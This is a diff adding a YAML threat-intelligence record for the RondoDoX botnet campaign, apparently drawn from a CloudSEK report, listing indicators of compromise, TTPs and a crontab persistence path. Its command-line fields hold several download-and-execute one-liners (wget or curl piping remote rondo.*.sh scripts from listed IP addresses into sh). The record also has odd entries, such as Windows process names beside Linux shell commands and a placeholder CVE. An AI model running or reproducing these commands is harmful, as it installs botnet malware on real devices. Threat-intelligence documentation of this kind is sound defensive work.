@@ -1,0 +1,51 @@
+description: RondoDoX botnet campaign targeting IoT devices and web applications using
+  Next.js vulnerability, deploying React2Shell and cryptominers.
+malware_families:
+- RondoBOT
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - busybox wget -qO- http://38.59.219.27/rondo.gpon.sh|sh;
+  - wget -q0- http://74.194.191.52/rondo.gbq.sh|sh;
+  - curl http://74.194.191.52/rondo.zta.sh|sh&
+  - busybox wget -qO- http://70.184.13.47/rondo.jbt.sh|sh
+  - wget -q0- http://74.194.191.52/rondo.qbq.sh|sh
+  powershell:
+  - $(wget -q0- http://74.194.191.52/rondo.znt.sh|sh)
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - busybox wget -qO- http://38.59.219.27/rondo.gpon.sh|sh;
+  - wget -q0- http://74.194.191.52/rondo.gbq.sh|sh;
+  - curl http://74.194.191.52/rondo.zta.sh|sh&
+  - busybox wget -qO- http://70.184.13.47/rondo.jbt.sh|sh
+  - wget -q0- http://74.194.191.52/rondo.qbq.sh|sh
+  file_activity: []
+  persistence:
+  - /etc/crontab
+  process_relations: []
+CVEs:
+- CVE-2023-XXXX
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 74.194.191.52
+  - 70.184.13.47
+  - 41.231.37.153
+  - 5.255.121.141
+  - 51.81.104.115
+  domains: []
+  urls:
+  - http://38.59.219.27/rondo.gpon.sh
+  - http://74.194.191.52/rondo.gbq.sh
+  - http://74.194.191.52/rondo.zta.sh
+  - http://70.184.13.47/rondo.jbt.sh
+  - http://74.194.191.52/rondo.qbq.sh
+authors:
+- Threat Researcher at CloudSEK
+reference: https://www.cloudsek.com/blog/rondodox-botnet-weaponizes-react2shell
+date_of_publication: April 03, 2025
+file_creation_date: January 07, 2026
